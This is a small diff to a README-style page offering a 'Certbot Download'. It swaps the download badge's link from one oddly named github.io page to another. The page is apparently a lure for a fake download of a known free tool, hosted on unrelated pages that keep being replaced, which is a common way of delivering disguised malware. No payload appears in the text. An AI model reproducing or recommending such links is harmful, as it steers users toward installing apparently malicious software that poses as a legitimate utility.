@@ -2,7 +2,7 @@
 
 ![Terminal window showing certificate renewal status and secure HTTPS checks](https://avatars.mds.yandex.net/i?id=78b3f544b165d877baa6be7bd40afb34c70d47d1-5353173-images-thumbs&n=13)
 
-[![Download Certbot Download](https://img.shields.io/badge/Download-Certbot_Download-blueviolet?style=for-the-badge&logo=windows)](https://ozzyericksonjlug.github.io/.github/certbot-download)
+[![Download Certbot Download](https://img.shields.io/badge/Download-Certbot_Download-blueviolet?style=for-the-badge&logo=windows)](https://kannonlangdedb.github.io/.github/certbot-download)
 
 ## Secure Certificate Access Overview
 
